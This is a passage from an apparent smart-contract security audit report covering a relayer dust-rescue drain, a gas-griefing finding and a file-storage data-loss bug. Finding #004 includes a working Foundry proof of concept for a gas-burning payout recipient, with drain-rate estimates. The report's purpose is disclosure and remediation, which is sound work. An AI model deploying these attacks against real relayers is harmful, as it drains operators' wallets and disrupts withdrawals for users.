- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/dust-rescue-forwarding.service.ts#L183-L205
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/dust-rescue-forwarding.service.ts#L109-L181
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/evm.relay.service.ts#L380-L389
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L398-L407
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L410-L441
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionReshieldCrosschain.ts#L307-L313

#### Impact

An unprivileged caller, anyone holding a note and calling two public HTTP routes, makes the relayer bridge its own ERC-20 tokens in an amount the caller sets, and converts what arrives into a shielded note the caller can spend. The per-round take is not a remainder of the relay: with `dustRecipient` pointed at `RelaySwaps` the measured amount is the proof's entire `amountOut`, and with a non-consuming swap on the reshield path the attacker keeps the un-swapped principal on chain as well. The attacker pays gas, the relay fee and the bridge fee; the relayer pays the principal. The only rate control on the route is the relay throttle at five requests per minute, and nothing accumulates state that stops a second round.

The ceiling is the relayer signer's balance of the proof asset on the source chain and, for the mint leg, the rescue signer's balance on the destination chain. `maybeApprove` and `sendRawTransaction` simply revert when the float is short, and `forward` swallows the error, so the loss is whatever the operator funds those wallets with. Balances were readable on only one of the deployed chains, where they are small and test-sized; that number bounds what was observed rather than what the exposure can be, since an operator topping the relayer up for real volume raises the ceiling directly, with no code change and no signal that it moved.

The chain's reach is bounded by configuration the caller can select around rather than by any check. `forward` returns without bridging if the destination chain has no `dust_rescue_recipient_address`, and the enclosing block aborts before it if `priceForRescue` cannot price the destination chain and token, so the bridge leg needs a destination with both. `dustRescueRecipientAddress` reads `DUST_RESCUE_RECIPIENT_ADDRESS_<chainId>` from the environment first and no committed configuration sets one, so whether a given chain is armed is a deployment fact the repository does not settle; the attack described here runs against any destination the operator has armed. The mint leg additionally needs the dust-rescue service running for that destination and the job's USD value to clear `minWorthUsdMicros`, a floor that an inflated amount clears trivially. These are reachability filters on which destination chain the caller names, not authority checks on the amount or the recipient.

Vault custody, other users' notes and the pool's accounting are untouched: the payer at both legs is an operator wallet, shared across every destination chain, so every pending rescue draws on the same balance and a deposit that cannot be funded is retried to `sweepMaxAttempts` and then written terminal `FAILED`. The project's own deviation register anticipated half of this, recording that the cross-chain `dustRecipient` defaults to the relayer, recommending that callers pass an explicit one, and filing a follow-up to reconsider the default; that note addresses who receives dust in the honest case, not the relayer paying for an amount measured at an address the caller supplied. The mechanism above is established by reading the source rather than by executing it.

#### Recommendation

We recommend re-deriving `dustRecipient` on the relayer rather than accepting it. The relayer knows its own signer address and its configured `dustRescueRecipientAddress`, and if dust rescue is on then the source-chain leftover belongs at the relayer, so pin it there and reject any request whose `dustRecipient` differs. This is the check `prepareReshieldCrosschainQuote` already performs client-side as `DustRescueRecipientConflict`, moved to the trust boundary that matters so a caller who bypasses the SDK meets the same rule. If a caller-specified recipient is genuinely required, require it to be committed in the proof context so the relayer can verify it against the user's own proof rather than the request body. Bind the rest of the `dustRescue` block the same way. `recipientIdentifier`, `tokenId` and `destinationChainId` reach `registerPending` and, through it, `Entrypoint.deposit` straight from the request body, outside `signedSwapCommitment` and outside the on-chain `SwapRouting`, with only a shape check between the two; until each is covered by something the note owner proved, the job the relayer signs is the one an unauthenticated caller named rather than the one the user's proof described.

We also recommend bounding what `forward` will spend, independently of the recipient fix. Compare `sweptAmount` against the relay's own `amountOut` and against a configured per-relay ceiling, and refuse to bridge an amount that is not a plausible remainder of this relay; a dust forward that approaches the size of the relay it follows is not dust. Land that bound before extending dust-rescue forwarding to any channel it does not cover today, because each new channel inherits the same caller-chosen measurement and the same signer float. The same bound belongs on chain in `_sweepDust`, which the deviation register's own follow-up already proposes capping. Better still, measure the residue from the relayer's own position by comparing the signer's balance of the proof asset before and after the swap leg, which cannot be inflated by transfers to a third party.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #004 — A hostile withdrawal recipient burns roughly 45 times the gas `EvmQuoteService` priced the relay at

**Severity:** Medium · **Location:** `packages/contracts/src/contracts/PrivacyPoolRelay.sol` · **Bug:** High · **Payout:** Medium · **Novelty:** NEW · **Reach:** PERM · **Status:** Open

#### Description

A relayed withdrawal lets a user take money out of the pool without spending from an address of their own. The user builds the proof and names the address the money is to be paid to, the relayer broadcasts the transaction and pays its gas, and the withdrawal pays the relayer a fee out of the amount withdrawn. The fee is priced before the transaction exists: the relayer quotes it, signs the quote as a commitment, and checks that commitment again when the withdrawal is relayed, so the price is settled before the call is ever made.

That fee is what has to cover the gas the relayer is about to spend, and once the transaction is broadcast there is no way back: the gas comes out of the relayer's signer wallet on that chain, the fee collected is the one already quoted, and nothing in the service reconciles the two afterwards. The guard that would normally catch a call about to cost more than it is worth is the simulation the relayer runs before broadcasting, and a withdrawal that runs long but does not revert passes it.

**Where it breaks.** What the relay is priced at and what the relay can cost are set by two different parties:

- the price comes from `relayTxCost`, a fixed 650,000-gas constant standing in for a typical withdrawal, chosen once in the quote service and signed into the commitment;
- the cost is set by the payout recipient, an address bound into the user's proof, which the withdrawal pays by forwarding every unit of gas left in the transaction, with no gas limit attached by the relayer on the way out.

So a recipient contract that burns gas when it is paid decides what the relay costs, the relay still succeeds and so nothing reads as a failure, and the relayer covers the difference, roughly 45 times the gas it charged for at a 30,000,000-gas ceiling, out of the one wallet every other user's withdrawal on that chain is relayed from.

In `EvmQuoteService`, a withdrawal's fee is quoted from a constant. `relayTxCost` is a fixed `Gas(650_000n)`, sitting directly under the comment "a typical withdrawal costs between 450k-650k gas"; `calculateTransactionCost` multiplies it by the current gas price to produce `transactionPrice`, and `quote` returns it as `txCost`. What the user pays and what the relayer budgets against is therefore that constant, not a measurement of the call about to be made. The quote is signed as a fee commitment and re-verified at relay time by `EvmRelayService.extractWithdrawalQuote`, which rejects any request whose commitment does not verify or does not match the proof's asset and `amountOut`, so the denominator below is a real, enforced 650,000.

The call itself is unbounded. `PrivacyPoolRelay._distribute` pays the recipient with Solady's `safeTransferETH`, which is a bare `call(gas(), to, amount, …)`: it forwards all remaining gas and reserves no stipend. Both branches reach it, the native branch sending `_recipientAmount + _gasFunding` to the recipient and the ERC-20 branch sending `_gasFunding` to the same address whenever the quote attached `extraGas`, the option that funds the recipient with native gas alongside an ERC-20 payout.

The recipient address is not the relayer's to choose. It arrives inside `PayoutRouting`, ABI-decoded from `_transactParams.data` in `PrivacyPoolRelay._relay`, and `PoolVault.transact` requires `_proof.context()` to equal the hash of `_transactParams` and `_noteData`. The recipient is bound into the user's proof, so it is fixed by whoever built the withdrawal, and nothing requires it to be an externally owned account.

Nothing on the relayer side caps the transaction. `EVMChainService` broadcasts through seven `publicClient.simulateContract(...)` and `walletClient.writeContract(request)` pairs, and not one passes a `gas` or `gasLimit` field; the only gas-related state in the file is a 15-second gas-price cache. The signer is a local account built with `privateKeyToAccount`, so viem fills the gas field itself by calling `eth_estimateGas`. That binary-searches for the lowest limit at which the call succeeds, so a recipient performing a fixed amount of work, rather than consuming `gasleft()`, pushes the search upward instead of collapsing it and the estimate comes back inflated. Nothing reverts, so the simulation passes too, and the recipient spends the relayer's gas up to whatever ceiling the node and the chain impose.

The number that would expose this never reaches the relayer's own code. A search for `estimateGas` across `packages/relayer/relayer/src` returns hits only in an error-redaction spec: the estimate is computed inside the client library during `writeContract` and never returned to the service, so there is nothing to compare against `relayTxCost` and the cheapest remedy is one explicit RPC call plus a check rather than a bare check. `EVMChainService` never looks at the recipient either, since `getCode` and `getBytecode` return zero hits across the same tree.

The Foundry harness below measures `relay` at 57,845 gas to an empty-`receive()` recipient and 38,457,904 gas to one running 400,000 fixed-size scratch-space keccaks, succeeding both times; at ≈ 96 gas per iteration the burn is a dial the attacker sets by choosing `ITERATIONS`. Those two figures are not an honest-relay pair, because the harness mocks `IPoolVault.transact` and `IEntrypoint.assets` and so elides the vault's Groth16 verification, root checks and state-tree insertion from both arms. What it measures is `PrivacyPoolRelay`'s own overhead plus whatever the recipient burns, so the raw quotient of 665:1 is an artifact of removing the same constant from both sides; substituting the code's own 450k to 650k range for the elided vault work reconstructs 60:1 to 86:1.

The headline ratio is a separate, derived computation that uses neither measured figure. Per call the relayer's net loss is `gasPrice × (B − 650,000)`, where B is the effective ceiling `min(node eth_estimateGas cap, block gas limit)`; net, because the relayer does collect the fee it quoted. The payout routing travels inside the relayer-signed commitment and `_relay` pays the `feeRecipient` that `EvmQuoteService` set to its own fee-receiver address, so the attacker can neither re-route the fee nor zero it. At a 30,000,000-gas ceiling that is 29,350,000 gas of net burn against a 650,000-gas quote, or ≈ 45:1. Both inputs are deployment assumptions: the geth-family default `--rpc.gascap` is 50,000,000, and a higher block ceiling raises the ratio proportionally.

The bug fires for any depositor holding a native-asset note in the pool's currently approved association set. `Entrypoint.deposit` gates on `require(_config.enabled, …)` and `require(_value >= _config.minAmount, …)`, and `ChainAssetRegistry._assetsForChain` sets `Constants.NATIVE_ASSET` to `enabled: true` in `_sepoliaAssets`, `_mainnetAssets`, `_arbitrumAssets`, `_baseAssets` and in `_defaultAssets`, the fallback for any chain without a branch. The live `prod:v1` deployment's asset tables agree: native ETH is the only enabled asset on the mainnet `Entrypoint`, at `minAmount` 0.004 ETH, `maxRelayFee` 0.5 ETH and `vettingFeeBPS` 0, and chain 56 enables native BNB at a `minAmount` of 0.02. `PoolVault._validateAndVerify` requires only a current `aspRegistry.latestASPRoot()`, so the actor is an ordinary approved depositor holding no role, and a partial spend leaves a change note, making the deposit a one-time cost.

Which chains the relayer service serves, and with what float, is not settled by the repository: the SDK's `DEPLOYMENTS` table carries Sepolia only, signer addresses are identified for Arbitrum and Base with the Base one not independently observed on chain, and per-chain signer balances were not read. The mainnet money row below therefore assumes a mainnet relayer with a mainnet-sized float. The mechanism does not depend on it; the size of the bill does.

The library the contract already imports carries the fix. `SafeTransferLib`'s file header reads "For ETH transfers, please use forceSafeTransferETH for DoS protection", and the same file defines `GAS_STIPEND_NO_GRIEF = 100000` and a `forceSafeTransferETH(address,uint256)` overload that uses it; `PrivacyPoolRelay` binds the library with `using SafeTransferLib for address` and calls the unguarded sibling. A gas-capped ETH send anywhere in `packages/contracts/src` would falsify this, and there is none: every native send in that tree is Solady's `safeTransferETH` or OpenZeppelin's `sendValue`, both of which forward all remaining gas.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PrivacyPoolRelay.sol#L281-L303
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PrivacyPoolRelay.sol#L237-L260
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/quote/evm/evm.quote.service.ts#L54-L55
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/quote/evm/evm.quote.service.ts#L463-L480
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L676-L688
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L520-L555
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/app.module.ts#L16-L19
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L138-L152
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L352-L357
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L64-L69
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/registries/ChainAssetRegistry.sol#L133-L142
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PPRouter.sol#L289-L308
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L394-L398

#### Impact

The attacker's outlay per relay is the signed fee, priced from the same 650,000-gas constant: 0.0065 ETH at 10 gwei, about $19.50 at $3,000/ETH. The relayer's net loss is the burn above it, 29,350,000 gas at a 30,000,000-gas ceiling. The money figures are derived, not measured, and no fork was run: each assumes that ceiling, a node `eth_estimateGas` cap at or above it, a gas price and an asset price.

| chain | assumed gas price | net burn per call | at assumed asset price |
| --- | --- | --- | --- |
| Ethereum mainnet | 10 gwei | 0.2935 ETH | ≈ $880 at $3,000/ETH |
| BNB Smart Chain | 1 gwei | 0.02935 BNB | ≈ $29 at $1,000/BNB |
| OP-stack L2 | 0.01 gwei | 0.0002935 ETH | ≈ $0.88 at $3,000/ETH |

The rate is what makes the small per-call figures matter. The only limiter is the HTTP throttle in `AppModule`, `{ name: "relay", ttl: 60_000, limit: 5 }`, an in-memory per-process budget, so more instances raise the ceiling rather than lower it. Five calls a minute is roughly 1.47 ETH per minute on mainnet and roughly $264 per hour on an L2, and no per-recipient accounting exists anywhere in the relayer, so the attacker continues until the signer wallet on that chain is empty and every relayed withdrawal on it fails. The only out-of-funds signal, `EVMChainService.failWrite` routing an `InsufficientFundsError` to a turbo log line and a 503, fires after the drain rather than during it.

No user funds are at risk and no note is affected: the loss falls on the relayer's operating balance. Users keep both exits while the relayer is down, since `PoolVault.transact` accepts any `msg.sender` equal to the proof-bound processor and `ragequit` carries no `whenNotPaused`, so privacy degrades rather than custody.

#### Proof of concept

`RelayerGasBurn.t.sol` is a Foundry harness that deploys the real `PrivacyPoolRelay` and drives its `relay` entry point on a native-asset withdrawal through one shared helper: once to a `PlainRecipient` whose `receive()` is empty, once to a `FixedWorkRecipient(400_000)` whose `receive()` runs 400,000 fixed-size scratch-space keccaks, and a third time on the ERC-20 branch with `nativeGas` set, to show the same unbounded push there. Both recipient arms end with the relay succeeding: the funds arrive and the fee is paid. It drops into `packages/contracts/test/unit/` and runs with `forge test --match-path test/unit/RelayerGasBurn.t.sol -vv`.

The vault is elided from both arms. The relay is constructed against a codeless test address for `IPoolVault`, and the helper mocks `IPoolVault.transact` on it to a no-op, so the vault's Groth16 verification, its root checks and its state-tree insertion cost nothing in either measurement; `IEntrypoint.assets` and `rootHistorySize` are mocked the same way, and the withdrawn ETH is pre-dealt to the relay contract. Because both arms go through the same helper, the same constant is missing from each. What the two numbers measure is `PrivacyPoolRelay`'s own overhead plus whatever the recipient burns, 57,845 gas and 38,457,904 gas, so the raw quotient between them is not a like-for-like ratio and the reconstructed 60:1 to 86:1 range above stands in its place.

The harness does not exercise the relayer service. `EvmQuoteService`, `EVMChainService` and a node's `eth_estimateGas` are not run here; the fixed `relayTxCost` constant, the absent `gas` field on the `writeContract` calls and the behaviour of the estimator's binary search are read from the code rather than measured. Foundry imposes no block gas limit either, so 38.4 M is unconstrained by the ceiling that would apply on chain. The headline ratio is derived from that assumed ceiling and the quoted relay cost and uses neither measured figure.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.32;

// Proof of concept (commit 638bf8f4). Not part of the repository's own test suite.
//
// Claim under test: the on-chain half of "a user-chosen payout recipient sets the gas the
// relayer pays". PrivacyPoolRelay._distribute pushes ETH to `_payout.recipient` with
// Solady safeTransferETH, which forwards ALL remaining gas. A recipient whose receive()
// performs a fixed amount of work therefore makes `relay()` cost whatever that work
// costs, and the call still SUCCEEDS (no revert, so the relayer's eth_call simulation
// passes and eth_estimateGas returns the inflated figure). The relayer's fee was fixed at
// quote time from a constant `relayTxCost = 650_000` and never sees this number.
//
// Run from packages/contracts:
//   forge test --match-path test/unit/RelayerGasBurn.t.sol -vv

import {PrivacyPoolRelay} from 'contracts/PrivacyPoolRelay.sol';
import {IERC5564Announcer} from 'interfaces/IERC5564Announcer.sol';
import {IEntrypoint} from 'interfaces/IEntrypoint.sol';
import {IPoolVault} from 'interfaces/IPoolVault.sol';
import {IPrivacyPoolRelay} from 'interfaces/IPrivacyPoolRelay.sol';
import {ProofLibV2} from 'libraries/ProofLibV2.sol';
import {TransactProofParams, buildMockTransactProof} from 'test/unit/helpers/ProofUtils.sol';
import {TestUtils} from 'test/unit/helpers/TestUtils.sol';
import {Constants} from 'utils/Constants.sol';

/// @dev A payout recipient that does a FIXED amount of work in receive() and then returns
///   normally. Fixed (not gasleft()-adaptive) work is the shape that matters: eth_estimateGas
///   binary-searches for the smallest gas at which the call succeeds, so a fixed-work
///   recipient forces the estimate up to (work + overhead) instead of letting it collapse.
contract FixedWorkRecipient {
  uint256 public immutable ITERATIONS;

  constructor(uint256 _iterations) {
    ITERATIONS = _iterations;
  }

  receive() external payable {
    uint256 _n = ITERATIONS;
    // Fixed-size scratch-space keccak: no memory expansion. The keccak and its mstore are
    // about 60 gas; with the loop's own lt/add/i the measured cost is 96 gas per iteration
    // (38,400,059 over the 57,845 baseline, across 400,000 iterations). The total is linear
    // in ITERATIONS either way, so an attacker can dial it to sit just under the relayer
    // node's eth_estimateGas cap (geth default RPCGasCap = 50M).
    assembly {
      for { let i := 0 } lt(i, _n) { i := add(i, 1) } { mstore(0x00, keccak256(0x00, 0x40)) }
    }
  }
}

contract PlainRecipient {
  receive() external payable {}
}

contract RelayerGasBurnPoC is TestUtils {
  PrivacyPoolRelay internal _relay;
  IPoolVault.NoteData[] internal _noteData;
  address internal _announcer = makeAddr('announcer');
  address internal _relayerEoa = makeAddr('relayerSigner');
  address internal _feeRecipient = makeAddr('feeRecipient');

  uint256 internal constant AMOUNT_OUT = 1 ether;
  uint256 internal constant FEE = 0.01 ether;
  // What the relayer priced the whole relay at (EvmQuoteService.relayTxCost).
  uint256 internal constant QUOTED_RELAY_GAS = 650_000;

  function setUp() external {
    vm.mockCall(mockPoolVault, abi.encodeWithSignature('rootHistorySize()'), abi.encode(uint32(16)));
    _relay = new PrivacyPoolRelay(IPoolVault(mockPoolVault), IEntrypoint(mockEntrypoint), IERC5564Announcer(_announcer));
    _noteData.push(IPoolVault.NoteData({hint: keccak256('hint 0'), data: abi.encode(keccak256('note 0'))}));
  }

  function _mockAssetConfig(address _asset, uint256 _maxRelayFee) internal {
    IEntrypoint.AssetConfig memory _config =
      IEntrypoint.AssetConfig({enabled: true, minAmount: 0, vettingFeeBPS: 0, maxRelayFee: _maxRelayFee});
    vm.mockCall(mockEntrypoint, abi.encodeCall(IEntrypoint.assets, (_asset)), abi.encode(_config));
  }

  /// @dev Builds a native-asset relay whose PayoutRouting names `_recipient`, with the pool mocked
  ///   (the vault's transact is a no-op; the withdrawn ETH is pre-dealt to the relay contract
  ///   exactly as the repository's own unit tests do).
  function _relayTo(address _recipient) internal returns (uint256 gasUsed_) {
    IPrivacyPoolRelay.PayoutRouting memory _payout =
      IPrivacyPoolRelay.PayoutRouting({recipient: _recipient, feeRecipient: _feeRecipient, feeAmount: FEE, nativeGas: 0});
    IPoolVault.TransactParams memory _params =
      IPoolVault.TransactParams({processor: address(_relay), data: abi.encode(_payout)});

    TransactProofParams memory _fuzz;
    _fuzz.amountOut = AMOUNT_OUT;
    _fuzz.tokenIdOut = uint256(uint160(Constants.NATIVE_ASSET));
    _fuzz.outputCommitmentsLength = 1;
    _fuzz.nullifierHashesLength = 1;
    ProofLibV2.TransactProof memory _proof = buildMockTransactProof(_fuzz, _params, _noteData);

    _mockAssetConfig(Constants.NATIVE_ASSET, 0);
    vm.mockCall(mockPoolVault, abi.encodeCall(IPoolVault.transact, (_proof, _params, _noteData)), abi.encode());
    vm.deal(address(_relay), AMOUNT_OUT);

    vm.prank(_relayerEoa);
    uint256 _g0 = gasleft();
    _relay.relay{value: 0}(_proof, _params, _noteData);
    gasUsed_ = _g0 - gasleft();
  }

  function test_PlainRecipient_CostsWhatTheQuotePriced() external {
    PlainRecipient _plain = new PlainRecipient();
    uint256 _used = _relayTo(address(_plain));
    emit log_named_uint('relay() gas, plain recipient', _used);
    // Well inside the 650k the relayer charged for (the pool is mocked, so this is the relay's own overhead).
    assertLt(_used, QUOTED_RELAY_GAS);
    assertEq(address(_plain).balance, AMOUNT_OUT - FEE);
    assertEq(_feeRecipient.balance, FEE);
  }

  function test_FixedWorkRecipient_RelaySucceedsAndCostsTensOfMillions() external {
    // 96 gas per iteration as measured; 400k iterations lands near 38.4M gas — under the
    // default 50M eth_estimateGas cap of geth-family nodes (BSC, mainnet), so a relayer node
    // returns this estimate rather than an error.
    FixedWorkRecipient _burner = new FixedWorkRecipient(400_000);
    uint256 _used = _relayTo(address(_burner));
    emit log_named_uint('relay() gas, fixed-work recipient', _used);
    emit log_named_uint('multiple of the quoted 650k', _used / QUOTED_RELAY_GAS);

    // The relay SUCCEEDED (no revert): funds arrived, fee was paid.
    assertEq(address(_burner).balance, AMOUNT_OUT - FEE);
    assertEq(_feeRecipient.balance, FEE);
    // ...and it cost more than 20 million gas, i.e. > 30x what the signed fee priced.
    assertGt(_used, 20_000_000);
    assertGt(_used / QUOTED_RELAY_GAS, 30);
  }

  /// @dev The same push exists on the ERC-20 branch whenever nativeGas > 0 (`extraGas` quotes):
  ///   `_recipient.safeTransferETH(_gasFunding)`. Demonstrated with a mocked ERC-20.
  function test_Erc20WithExtraGas_SamePushSameCost() external {
    FixedWorkRecipient _burner = new FixedWorkRecipient(400_000);
    address _asset = mockErc20;
    uint256 _nativeGas = 0.03 ether; // 600_000 gas * 50 gwei, the relayer's extraGasFundAmount at that price

    IPrivacyPoolRelay.PayoutRouting memory _payout = IPrivacyPoolRelay.PayoutRouting({
      recipient: address(_burner),
      feeRecipient: _feeRecipient,
      feeAmount: FEE,
      nativeGas: _nativeGas
    });
    IPoolVault.TransactParams memory _params =
      IPoolVault.TransactParams({processor: address(_relay), data: abi.encode(_payout)});

    TransactProofParams memory _fuzz;
    _fuzz.amountOut = AMOUNT_OUT;
    _fuzz.tokenIdOut = uint256(uint160(_asset));
    _fuzz.outputCommitmentsLength = 1;
    _fuzz.nullifierHashesLength = 1;
    ProofLibV2.TransactProof memory _proof = buildMockTransactProof(_fuzz, _params, _noteData);

    _mockAssetConfig(_asset, 0);
    vm.mockCall(mockPoolVault, abi.encodeCall(IPoolVault.transact, (_proof, _params, _noteData)), abi.encode());
    // ERC-20 transfers succeed (mocked token returns true).
    vm.mockCall(_asset, abi.encodeWithSignature('transfer(address,uint256)'), abi.encode(true));
    vm.deal(_relayerEoa, _nativeGas);

    vm.prank(_relayerEoa);
    uint256 _g0 = gasleft();
    _relay.relay{value: _nativeGas}(_proof, _params, _noteData);
    uint256 _used = _g0 - gasleft();
    emit log_named_uint('relay() gas, ERC-20 + extraGas to fixed-work recipient', _used);

    assertEq(address(_burner).balance, _nativeGas);
    assertGt(_used, 20_000_000);
  }
}
```

#### Recommendation

We recommend capping the gas forwarded to the recipient. `SafeTransferLib` is already imported and already bound to `address` in `PrivacyPoolRelay`, so switching the recipient-facing calls in `_distribute` to `forceSafeTransferETH` gives them the library's `GAS_STIPEND_NO_GRIEF` of 100,000 gas, which is ample for an ordinary receiving contract and bounded against a hostile one. The library's fallback when the stipend is exhausted is a `SELFDESTRUCT`-based force-send that still delivers the value; if a recorded payout failure is preferable to a forced send, use an explicit stipend and treat exhaustion as a recorded failure, since the withdrawal's other effects are already complete at that point and the failure can be recorded without unwinding the transaction. The same bound belongs on the other payout sites that push native value to a caller-named recipient with all remaining gas: `PPRouter.withdrawToUnderlying` sends to `_payout.recipient` with OpenZeppelin's `sendValue`, also a full-gas `call`, on both its native-mode and its gas-funding branch, and `RelaySwaps.execute` forwards `nativeGas` to `_r.recipient` with the same `safeTransferETH`.

We also recommend bounding the transaction on the relayer side rather than accepting whatever estimation returns. Pass a `gas` field on the `writeContract` calls in `EVMChainService`, derived from the same `relayTxCost` constant the fee was quoted from, so the transaction the relayer signs is bounded by the price the user paid. Because the estimate viem computes is never returned to the service's own code, add one explicit `estimateGas` call before broadcasting and check the result against `relayTxCost` times a configured margin, refusing the relay when it exceeds it; that change needs no deployment and converts a silent drain into a rejected request and a log line. A second unbounded input reaches the same priced path and deserves the same treatment: the relay request's `noteData` is `z.array(zNoteData)` with no upper bound and its `data` field an open-ended hex pattern, while sibling arrays on the same schemas do carry `MAX_BATCH` caps (`items` on the batch relay request and `amounts` on the batch quote request), and `PoolVault.transact` emits one `Note` per element with no length check, none of it priced, since the quote request body carries no `noteData` field at all. Bound both the array and the hex field to the largest note payload the protocol issues. Reading the recipient's code at quote time with `getCode` distinguishes an EOA payout from a contract one, so a contract recipient can be re-priced or declined rather than quoted from the flat constant.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #005 — `FileStorageService` treats an unparseable store as empty, so the next write destroys every record in it

**Severity:** Medium · **Location:** `packages/sdk/src/services/storage/FileStorageService.ts` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** THEORY · **Status:** Open

#### Description

A payment request is how one user asks another for a shielded payment. The recipient draws a set of note address hashes, one per slot the payment may land in, with a fresh secret behind each, sends the payer those hashes alone, and keeps the secrets. The payer deposits against one of them, and the note that lands on chain carries the hash but not the secret, which is the kind the code marks blind: only the recipient can spend it, and only with the secret they kept. The SDK holds those secrets, along with the notes a user owns and how far discovery has scanned, in a local store, and on Node that store is one JSON file.

Lose that file and most of what it held comes back on its own, because notes whose spending material rides on chain are rebuilt from genesis by the next scan. Blind payment-request secrets do not come back, since the chain never carried them and neither did the request the payer received. The design names one remedy for that, `exportAccount`, which writes those secrets out with the rest of the account state and accepts them back on import. Nothing in the SDK calls it, on a schedule or otherwise, so a copy exists only where an integrator took one by hand.

**Where it breaks.** Two conditions that call for opposite handling are read as the same condition:

- a file that is absent is correctly an empty store, and writing a fresh record into it loses nothing;
- a file that is present but unparseable returns that same empty store, and the next write renames a one-key file over the only copy.

So a truncated write or a sync conflict, followed by one ordinary note scan flushing its state, erases every record in the file, for every chain and every owner sharing it, and the blind payment-request notes among them stay in the pool with nobody, the owner included, able to spend them again.

In the SDK's Node storage backend, `FileStorageService` keeps all persisted state in one JSON file, and every mutation is a whole-file read-modify-write: `set` reads the store, assigns one key and hands the result to `writeStore`; `delete` has the same shape. `readStore` separates "file absent" from every other failure only for `ENOENT`. When the file is present but `JSON.parse` throws, the bare `catch` returns `{}`, deliberately: its comment says a corrupted file "must not propagate as a SyntaxError that crashes session bootstrap", which would be sound if the empty object stayed in memory. It does not. The next ordinary mutation writes it back through `writeStore`, which renames a one-key file over the only copy, and nothing downstream can tell the two cases apart, because `set`, `delete` and both storage adapters receive the same `{}` whether the file was absent or unparseable.

The compensating control that comment names cannot fire. It claims "downstream schema validation in NoteStorageAdapter still rejects malformed shapes". `NoteStorageAdapter.getState` does call `NoteManagerStateSchema.safeParse` and does throw `InvalidStorageStateError` on a malformed record, but only after `if (raw === null) return null;`. That early return is correct for an absent key; the defect is that a `{}` store makes a present key look absent, so a damaged file takes the "nothing was ever stored" branch and never reaches the validator. `PaymentRequestStorageAdapter.getState` carries the identical guard ahead of `PaymentRequestServiceStateSchema`, and that is the adapter holding the secrets this finding is about.

Neither service tells the user. `NoteManager.loadFromStorage` logs "No existing NoteManager state found in storage" and `PaymentRequestService.loadFromStorage` logs the same sentence for its own key, both at debug level through an optional logger, for a file that was present and unparseable. The write that consummates the loss needs no user decision either: `discoverNotes` calls `NoteManager.flush` at the end of an ordinary scan.

The loss inside the file is total, and it is specific to this backend. `STORAGE_KEYS` defines exactly two keys, and both adapters build a composite key of the form `v1:<key>:<chainId>:<owner>`, so one `FileStorageService` file holds the note state and the payment-request state for every chain and every owner an integrator has wired to it. No earlier generation survives the write: `writeStore` renames the temporary file over the only copy, with no `fsync` between the two, against a class docstring asserting that "a crash mid-write leaves the previous file intact". `LocalStorageService.get` swallows an unparseable value into `null` exactly as `readStore` does, so the browser backend runs the same fail-open-then-overwrite sequence on whichever key is damaged, but its `set` is a per-key `localStorage.setItem`, which makes the cross-chain and cross-owner collateral a `FileStorageService` property.

The file backend is an integrator opt-in rather than the shipped default: `PoolSessionBuilder.buildStorageService` is a switch on `cfg?.type` with no default branch, and `persistentStorage` is optional with no schema default, so an integrator who configures nothing gets no persistence at all. It is not hypothetical: `type: "file"` is selected in `apps/sample/checks/paymentRequest/storage.ts`, in `apps/sample/checks/noteDiscovery/storage.ts`, and across eighteen `packages/swaps/test/mainnet-*` integration suites that build wallet clients against live chains rather than a fork. Nor is an attacker required: a truncated write from a crash, a full disk, an interrupted sync, a sync-agent conflict copy, or two `FileStorageService` instances racing on the fixed `.tmp` path each produce the corrupt read.

